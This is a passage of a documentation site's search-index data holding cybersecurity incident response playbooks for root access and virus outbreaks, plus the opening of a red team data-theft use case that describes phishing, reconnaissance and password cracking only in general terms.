implemented. The stage of notice and early reaction that is symbolised by the colour violet emphasises the need of taking preventative action to reduce damage.  Containment (Contain): Sky Blue  Error - Unable to Isolate; Escalate to Senior Management: In this case, attempts are made to stop additional unauthorised access and contain the root access situation. If the impacted systems cannot be isolated, top management is alerted right once so that the issue may be resolved. The containment measures intended to stop the spread of unauthorised access and stop escalation are represented by the colour sky blue.  Eradication (Erad): Light Green  Eradicate Root Access; Patch Vulnerabilities: This phase is all about fixing the underlying vulnerabilities and getting rid of unwanted access. To stop such events in the future, steps are made to remove unauthorised users and repair security flaws. Ensuring that the organization's systems are secure and removing unauthorised access are symbolised by the colour bright green.  Recovery (Recover): Brown  Monitor for Further Activity; Initiate Recovery Procedures: During this stage, the focus is on recuperating from the root access event and resuming regular operations. To find any remaining unapproved access, recovery steps are started, and continuous monitoring is carried out. The recovery phase, which aims to restore activities and strengthen security measures, is represented by the colour brown.  Post-Incident Actions (Post): Light Pink  Continue Monitoring for Threats; Conduct Regular Audits: Post-event activities are carried out in the last phase to assess the response's efficacy and pinpoint areas that require improvement. Regular audits and continuous threat monitoring are carried out to improve incident response resilience. The post-event initiatives intended to improve future response efforts and learn from the occurrence are represented by the colour light pink.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages  ​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"1. Preparation​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#1-preparation","content":" Objective: Putting in place the guidelines, practices, and tools required to handle root access issues in an efficient manner.Activities:Putting together a team for incident response with clear roles and duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Holding practice sessions and exercises on a regular basis to guarantee readiness and rehearse incident response protocols.Putting security and surveillance technologies in place to find and stop instances of root access.Outcome: A fully equipped company with the ability to react to root access events quickly and efficiently.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#52-detection","content":" Objective: Recognising warning signs of illegal access to the organization's resources and systems.Activities:Keeping an eye out for questionable activity, such as odd access patterns or unauthorised attempts at authentication.Using security information and event management (SIEM) and Intrusion detection systems (IDS) to find possible root access occurrences.Examining abnormalities and warnings to distinguish between authorised and unauthorised activity.Outcome: Rapid reaction and mitigation strategies are made possible by early root access event identification.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#53-analysis","content":" Objective: Recognising the kind and extent of the root access event.Activities:Gathering information and carrying out forensic investigation to ascertain the origin and degree of the illegal entry.Examining hacked networks and systems to find attack vectors and how they affect compromised data.Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs).Outcome: A thorough comprehension of the root access incident's origins, consequences, and accountability.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#54-containment","content":" Objective: Limiting the propagation and effects of the root access incident and stopping other illegal access or data leaks.Activities:Dividing up susceptible networks and systems to stop intruders from moving laterally.Putting safety measures and access restrictions in place to stop illegal access to sensitive data.Limiting or preventing harmful data, software, or network flow to stop more damage.Outcome: Efficient handling of the root access issue, reducing harm to the data and systems of the company.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#55-eradication","content":" Objective: Eliminating threats and any lingering vulnerabilities from the company's networks and IT systems.Activities:Removing illegal access and putting compromised systems back in a safe and secure condition.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and revising security protocols and guidelines to fix flaws or vulnerabilities found.Outcome: Elimination of all evidence of the root access incident and mitigation of vulnerabilities to stop it from happening again.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#56-recovery","content":" Objective: Restarting company operations and returning impacted systems and data to normal functioning.Activities:Restoring damaged systems and data backups to guarantee the integrity and accessibility of data.Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future.Putting user awareness and education programmes into action to reduce unauthorised access events in the future.Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post-Incident Review​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#57-post-incident-review","content":" Objective: Assessing the organization's reaction to the root access event, noting lessons learned and opportunities for improvement.Activities:Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results.Outcome: Improved preparedness for upcoming root access incidents and enhanced incident response capabilities.  ","version":"Next","tagName":"h3"},{"title":"6. Terminology​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Root Access  Incident Response  Playbook#6-terminology","content":" Terminology in incident response encompasses a range of concepts and terms essential for effective communication and understanding within the cybersecurity domain. It provides a common language for incident responders, enabling precise and unambiguous communication during incident response activities.  Root Access: The highest level of administrative access within a system or network, granting users unrestricted control over critical resources and settings.  Incident Response: A coordinated approach to managing and mitigating the impact of security incidents, encompassing detection, analysis, containment, eradication, recovery, and post-incident review stages.  Intrusion Detection System (IDS): A security tool designed to monitor network traffic and systems for signs of unauthorized access or malicious activity, generating alerts or notifications when suspicious behavior is detected.  Intrusion Prevention System (IPS): A security solution that goes beyond detection to actively block or prevent unauthorized access or malicious activity, helping to protect systems and networks from cyber threats.  User Behavior Analytics (UBA): The process of analyzing patterns of user behavior to detect anomalies or deviations from normal activity, helping to identify potential security incidents, including unauthorized access or insider threats.  Two-Factor Authentication (2FA): An authentication method that requires users to provide two forms of identification, typically a password or PIN combined with a second factor such as a code sent to a mobile device, to access a system or service.  Credential Theft: The unauthorized acquisition of user credentials, such as usernames and passwords, through various means such as phishing attacks, keylogging, or credential stuffing, enabling attackers to gain unauthorized access to systems or accounts.  Ransomware: Malicious software designed to encrypt or lock files and systems, typically demanding payment (ransom) from the victim in exchange for decryption keys or restoring access to the affected data. By understanding and utilizing these key terms, incident responders can effectively communicate, collaborate, and execute incident response activities, ultimately enhancing the organization's ability to detect, respond to, and recover from security incidents. ","version":"Next","tagName":"h2"},{"title":"Virus Outbreak Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#1-introduction","content":" The security of data, the continuity of operations, and the reputation of the organisation are all seriously threatened by virus outbreaks. To reduce damage and guarantee company resilience, virus attacks must be promptly identified, contained, and mitigated. This playbook outlines roles, duties, and processes for a successful response, providing an organised method for handling viral epidemics.  ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#11overview","content":" There is a methodical structure available in the Virus Outbreak Incident Response Playbook for identifying, stopping, eliminating, and recovering from virus attacks. It seeks to expedite reaction efforts and lessen the impact of viral outbreaks on organisational assets and stakeholders by developing defined standards and communication channels.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#12-purpose","content":" This playbook's goals are to:  Create a standardised procedure for handling viral outbreaks to guarantee efficacy and uniformity in event handling.Make it easier to quickly identify and confine viruses to stop their spread and reduce harm.Reduce the effect of viral outbreaks on the functioning of organisations and the resulting financial losses.During incident response efforts, encourage cooperation, coordination, and communication amongst response teams, stakeholders, and other relevant parties.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#13-attack-definition","content":" Malicious software, such as viruses, are created with the intent to harm, interfere with, or get unauthorised access to computer systems, networks, and data. They cover a wide range of dangers, such as ransomware, worms, trojans, and spyware, among others. Numerous routes, including malicious websites, email attachments, infected files, and software flaws, can allow viruses to enter a system.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#14scope","content":" Events related to virus outbreaks that impact the computers, networks, and endpoints of the company are covered in this playbook. It covers viral occurrences that affect stakeholders, data assets, and company procedures from both external and internal sources. This playbook is applicable to any situation that calls for a coordinated response, regardless of the type of virus or mode of distribution.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#2-attack-types","content":" There are several ways that virus outbreaks might appear, and each one poses different difficulties for incident response teams. The subsequent assault types are frequently linked to viral outbreaks:  ","version":"Next","tagName":"h2"},{"title":"2.1 File Infector Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#21-file-infector-viruses","content":" When executable files are opened, file infector viruses cling to them, multiply, and spread to other files, causing extensive harm.  Signs of File Infector Virus Activity:  Unknown corruption or alteration of executable files.Unexpected variations in checksums or file sizes.Reports of malicious file alarms from antivirus software.Unexpected rise in system resource consumption brought on by viral propagation.Suspicious network traffic coming from machines that have been compromised.  ","version":"Next","tagName":"h3"},{"title":"2.2 Macro Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#22-macro-viruses","content":" Macro viruses propagate by infecting spreadsheets and documents that include macros. The macros are subsequently performed when the file is accessed, potentially leading to data loss or system interruption.  Signs of Macro Viruses Activity:  Unusual actions or error messages while attempting to open spreadsheets or documents.Emails with links to malicious documents or attachments that seem suspicious.Reports of unforeseen modifications to the layout or substance of documents.Infected papers are found and quarantined by antivirus software.Increased network traffic because of the transmission or sharing of infected documents.  ","version":"Next","tagName":"h3"},{"title":"2.3 Boot Sector Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#23-boot-sector-viruses","content":" The master boot record (MBR) or boot sector of storage devices can get infected with boot sector viruses, which impair the system's ability to start correctly and may result in data loss or system failure.  Signs of Boot Sector Viruses Activity:  Anomalous errors during the boot process or the system's inability to boot up. Reports of system files being damaged or missing.Notifications from antivirus software that boot sector viruses are present.Adjustments to disc partitions or partition tables that are not explained.Suspicious behaviour on the network coming from devices that are infected and trying to propagate the infection.  ","version":"Next","tagName":"h3"},{"title":"2.4 Polymorphic Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#24-polymorphic-viruses","content":" With every infection, polymorphic viruses alter their look and coding structure, making antivirus software's job of detecting and eliminating them more difficult.  Signs of Polymorphic Viruses Activity:  Files with often changing signatures are identified by antivirus software and placed in quarantine.Random crashes or problems on compromised devices that are not explained.Reports of unusual or unpredictable behaviour from files or apps.A rise in network traffic as the virus looks to infect other machines.System logs demonstrating many attempts to run malicious code with different characteristics.  ","version":"Next","tagName":"h3"},{"title":"2.5 Resident Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#25-resident-viruses","content":" Because resident viruses lodge themselves in system memory, they can continue to function even after the system is restarted.  Signs of Resident Virus Activity:  Unexpected system lag or deterioration in performance.Antivirus software that looks for infections in RAM.Persistence in task management or process monitor of processes linked to viruses.  ","version":"Next","tagName":"h3"},{"title":"2.6 Multipartite Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#26-multipartite-viruses","content":" Multipartite viruses combine the traits of boot sector and file infector viruses to infect executable files as well as boot sectors, hence increasing their effect and spread.  Signs of Multipartite Viruses Activity:  Several antivirus notifications pointing to viruses in the boot sector and files.System instability or crashes that happen when apps are running, or the system is booting up.Reports pertaining to damaged or lost data in the impacted files and storage devices.Adjustments to system setups or settings that are not explained.Network behaviour suggestive of the spread of viruses via network drives or shared data.  ","version":"Next","tagName":"h3"},{"title":"2.7 Network Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#27-network-viruses","content":" By exploiting holes in network protocols or services, network viruses propagate via network connections.  Signs of Network Viruses Activity:  Abnormal trends in network traffic or sudden increases in network utilisation.Warnings from antivirus software that viruses are proliferating over network sharing.Identification of questionable behaviour on servers or network equipment.  ","version":"Next","tagName":"h3"},{"title":"2.8 Stealth Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#28-stealth-viruses","content":" To avoid being discovered by antivirus software, stealth viruses hide their existence and carry out their operations. They frequently use sophisticated strategies to stay undetected.  Signs of Stealth Viruses Activity:  Abnormal trends in network traffic or sudden increases in network utilisation.Suspicious behaviour or symptoms, yet antivirus scans show no viruses.Unusual modifications to file properties or timestamps that suggest manipulation.Anomalies that point to possible illegal access or manipulation in system logs or event data.Unusual activity on the network coming from devices that are compromised.Reports of anomalous activity or decreased system performance on infected systems.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#3-stakeholders","content":" Many stakeholders inside and outside the organisation must work together to respond to viral outbreaks effectively. Important roles are played by the following parties in the incident response process:  ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#31-it-security-team","content":" The IT security team oversees defending the company's digital assets against virus attacks, spotting security issues, and putting preventative and remedial measures in place. Among their responsibilities and roles are:  Evaluating the impact and reach of viral outbreaks through the analysis of security event data.Putting security measures in place to stop more illegal access and stop the spread of infections.Working together with the incident response team to control and reduce the effects of viral outbreaks.Carrying out forensic investigations to find the underlying cause of viral occurrences and stop them from happening again.Suggesting security improvements and offering incident response procedure advice to high management and other stakeholders.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#32-incident-response-team","content":" The incident response team oversees managing the organization's response to viral outbreaks and organising cleaning activities. Among their responsibilities and roles are:  Determining the extent and intensity of viral epidemics and carrying out the required corrective actions.Assembling staff and resources to lessen and mitigate the effects of viral assaults.Carrying out forensic investigations to ascertain the origin and scope of viral outbreaks and collect data for prospective legal actions.Notifying top management, outside contractors, and clients on crisis response strategies and recovery initiatives.Documenting best practices and lessons gained from viral occurrences will improve the organization's ability to respond to issues.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#33-communication-team","content":" Regarding viral outbreaks, the communication team oversees making sure that all internal and external stakeholders are informed in a clear and consistent manner. Among their responsibilities and roles are:  Creating and carrying out communication strategies to alert relevant parties—such as staff members, clients, and outside suppliers—about viral outbreaks.Creating and distributing communication materials to answer queries and Concerns from stakeholders, including as statements, news releases, and FAQs.Taking part in public relations and media relations campaigns to safeguard the organization's image and lessen the damaging effects of viral outbreaks.Delivering frequent reports on stakeholder engagement and communication activities to the senior leadership and incident response team.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#34-customers","content":" Clients are people or organisations who depend on the company's goods or services and might be impacted by viral pandemics. Among their responsibilities and roles are:  Notifying the company of any unauthorised or questionable conduct pertaining to their accounts or transactions.Supplying pertinent data or proof to support the incident response team's viral outbreak investigation.Following the advice and directives of the organisation to safeguard personal data and lessen the effects of virus outbreaks.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#35-third-party-vendors","content":" Third-party vendors are outside companies that supply the company with products, services, or assistance; they may also have access to its networks, data, and systems. Among their responsibilities and roles are:  Working along with the company's incident response team to find and fix security flaws or breaches pertaining to their goods or services.Giving the company help and support while it investigates and fixes any viruses that are damaging its networks or systems.Observing the duties imposed by law and contracts on data security and privacy, including the reporting of security breaches and assistance with incident response.  ","version":"Next","tagName":"h3"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  Notify Incident Response Team: This phase is the first of getting ready to deal with a viral epidemic. As soon as a viral epidemic is detected, the incident response team is informed. We use the colour yellow to represent this stage of preparation.  Identification (Identify): Red  Contain the Outbreak; Isolate Affected Systems: This phase entails locating the viral outbreak and containing it right away. Measures are implemented to segregate compromised systems and restrict the virus's dissemination. Red is used to represent the vital and urgent nature of this stage.  Notification (Notif): Violet  Review and update antivirus definitions; perform full system scans: Notifying pertinent parties and putting initial mitigation measures in place are the main goals of this stage. Various measures are implemented to lessen the influence of the outbreak, including altering login passwords, and doing malware assessments. Malicious activity is also examined, and stakeholders are informed so they may organise a response. This notice and early reaction step are represented by the colour violet.  Containment (Contain): Sky Blue  Error-unable to isolate; Escalate to senior management: At this point, attempts are being done to stop the outbreak's spread. Senior management is informed so that the affected systems may be resolved if they cannot be effectively isolated. The containment measures meant to stop the virus's spread are symbolised by the colour sky blue.  Eradication (Erad): Light Green  Eradicate Virus; patch vulnerabilities used inn outbreak: The objectives of this step are to eradicate the infection and record incident information. Procedures for removing malware are followed, and incident details are recorded for later use. Light green is used to represent the process of getting rid of the infection and making sure the organization's systems are safe.  Recovery (Recover): Brown  Monitor for Further Activity; Initiate Recovery Procedures: At this point, attempts are being undertaken to recover from the viral outbreak and get everything back to normal. Recovery processes are started, and continual surveillance is done to find any new virus activity. The recovery phase, which aims to resume regular operations, is symbolised by the colour brown.  Post-Incident Actions (Post): Light pink  Continue Monitoring for Threats; Conduct Periodic system scans: In the last phase, post-event activities are carried out to assess the effectiveness of the reaction and pinpoint areas that require improvement. A post-event evaluation is carried out to evaluate the organization's reaction to the viral epidemic, and ongoing threat monitoring is maintained. The post-event steps intended to improve future response efforts and learn from the occurrence are indicated by the colour light pink.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#51-preparation","content":" Objective: Putting in place the tools, processes, and regulations required to control virus outbreaks. Activities: Putting up a team dedicated to incident response with specific duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Ensuring preparedness via consistent training and event response practice.Putting security measures and surveillance systems in place to identify and contain viral outbreaks. Outcome: A well-prepared company that can react to virus outbreaks fast and efficiently.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#52-detection","content":" Objective: The goal of the detection stage is to look for indications of malware outbreaks or illegal access to the networks and systems of the company. Activities: Keeping an eye out for questionable behaviour, such strange access patterns, or unauthorised file transfers.Using security information and event management (SIEM) and intrusion detection systems (IDS) to find and stop threats.Separating malicious from genuine activities by analysing anomalies and alarms. Outcome: Rapid reaction and mitigating actions are made possible by early virus outbreak identification.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#53-analysis","content":" Objective: Recognising the characteristics and extent of the virus an outbreak. Activities: Gathering information and carrying out forensic investigation to determine the origin and severity of the virus infestation.Examining networks and systems that have been infiltrated to identify attack strategies and the impact on compromised data.Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs). Outcome: A thorough comprehension of the virus outbreak, considering its origins, consequences, and sources.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#54-containment","content":" Objective: Help lessen the effect of the virus outbreak and prevent more illegal access or data leaks. Activities: Dividing up susceptible machines and networks to stop intruders from moving laterally.Putting access restrictions and protections in place to stop illegal access to sensitive information.Limiting or preventing harmful data, software, or network flow to stop more damage. Outcome: Efficient handling of the virus outbreak, reducing harm to the company's information and infrastructure.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#55-eradication","content":" Objective: Removing all threats and vulnerabilities from the company's networks and IT systems, including those that still pose a threat. Activities: Deleting dangerous files and software and putting hacked computers back in a safe configuration.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and amending security guidelines and policies to fix any flaws or vulnerabilities found. Outcome: Eradication of all evidence of the virus breakout incident and mitigation of susceptibilities to avoid recurrence.  ","version":"Next","tagName":"h2"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#56-recovery","content":" Objective: To restart company operations and return impacted systems and data to normal. Activities: Restoring damaged systems and data backups to guarantee the integrity and accessibility of data.Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future.Putting user awareness and education programmes into action to stop virus breakouts in the future. Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- Incident Review​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#57-post--incident-review","content":" Objective: Evaluating and pinpointing areas for improvement and lessons gained in the company's reaction to the virus outbreak issue. Activities: Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results. Outcome: Improved incident response capacities and preparedness against virus outbreaks in the future.  ","version":"Next","tagName":"h3"},{"title":"6. Terminology​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Virus Outbreak Incident Response Playbook#6-terminology","content":" Virus Outbreak: A circumstance in which malicious software quickly spreads throughout the computers, networks, or devices of an organisation, usually with the goal of stealing, interfering with, or breaching data. Incident Response: A methodical and organised procedure designed to locate, contain, and lessen the harm a virus outbreak does to an organization's IT infrastructure to minimise interruption and get things back to normal. Forensic Analysis: The methodical analysis and assessment of digital data associated with the virus outbreak, such as malware samples, system artefacts, and network logs, to determine the source of the attack, estimate its extent, and supply proof for legal or investigative needs. Polymorphic Virus: A kind of virus that is challenging for antivirus software to identify and neutralise as it can alter its appearance or signature with every infection. During virus outbreaks, polymorphic viruses are renowned for their capacity to spread quickly and elude detection by conventional security measures. Endpoint Security: A thorough method for protecting mobile, laptop, and desktop computer systems—known as network endpoints—against online dangers including viruses. To prevent virus outbreaks, endpoint security solutions include host-based intrusion detection systems (HIDS), antivirus software, and endpoint detection and response (EDR) technologies. Infection Vector: The process or avenue via which a virus enters a network or organisation and infects systems. Email attachments, malicious websites, portable media (like USB drives), and software flaws are frequently used as entry points for virus outbreaks. Cyber Threat Hunting: Initiative-taking monitoring and scanning of networks and systems for indications of malicious behaviour or possible virus outbreaks. Cyber threat hunting is the process of identifying and eliminating threats before they become widespread viral outbreaks by examining network traffic, system behaviour, and records. ","version":"Next","tagName":"h2"},{"title":"Data-Theft Red Team Usecase","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase","content":"","keywords":"","version":"Next"},{"title":"1. Introduction:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#1-introduction","content":" Data theft is a big concern for companies. It can damage their reputation, finances, and compliance with regulations. The Red Team playbook for Data Theft Incident Response helps organizations prepare for such threats. It simulates different attack scenarios to see how well a company can detect, respond to, and minimize the impact of data theft incidents. This playbook gives a step-by-step guide for Red Team operations. It covers common ways attackers try to steal sensitive information, so companies can better defend against them.  ","version":"Next","tagName":"h2"},{"title":"2. Insider Threat:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#2-insider-threat","content":"   ","version":"Next","tagName":"h2"},{"title":"2.1 Objective:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#21-objective","content":" Gain unauthorized access to sensitive data using an employee's credentials.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#22-steps","content":" Conduct reconnaissance to identify potential targets and their access levels: In this step, the attacker gathers information about employees within the organization, their roles, and their access privileges. They might use publicly available information, social media profiles, or even engage in physical surveillance to learn about potential targets and their access to sensitive data.Phish target employee to obtain credentials or exploit existing vulnerabilities in their system: Phishing involves sending deceptive emails or messages to the target employee, tricking them into revealing their login credentials or downloading malicious software. The attacker may create convincing emails that appear to be from trusted sources, prompting the employee to click on links or enter sensitive information.Use obtained credentials to access sensitive data: With the stolen credentials, the attacker gains access to the organization's systems or network. They navigate through the network using the compromised credentials, seeking out sensitive data such as customer information, financial records, or intellectual property.  ","version":"Next","tagName":"h3"},{"title":"2.3 Tools and Techniques:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#23-tools-and-techniques","content":" Social engineering: Social engineering techniques manipulate individuals into divulging confidential information or performing actions that compromise security. This can include tactics like pretexting (creating a fabricated scenario to gain trust), baiting (enticing targets with something appealing), or tailgating (following an authorized person to gain physical access).Phishing emails: Phishing emails are crafted to appear legitimate and deceive recipients into providing sensitive information or clicking on malicious links. Attackers often use psychological tactics to create a sense of urgency or importance, leading the recipient to act without thinking critically about the email's authenticity.Password cracking tools: Password cracking tools are software programs designed to guess or crack passwords used to secure accounts or systems. These tools utilize various techniques such as brute force attacks (trying all possible combinations) or dictionary attacks (trying common words or phrases) to break into accounts with weak or easily guessable passwords.  ","version":"Next","tagName":"h3"},{"title":"3. External Attack:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#3-external-attack","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#31-objective","content":" Gain access to the company's network and exfiltrate sensitive data.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Data-Theft Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Data Theft Incident Response Usecase#32-steps","content":" Scan the company's network for vulnerabilities: In this step, the attacker uses specialized software known as vulnerability scanners to identify weaknesses in the company's network infrastructure, including open ports, outdated software versions, or 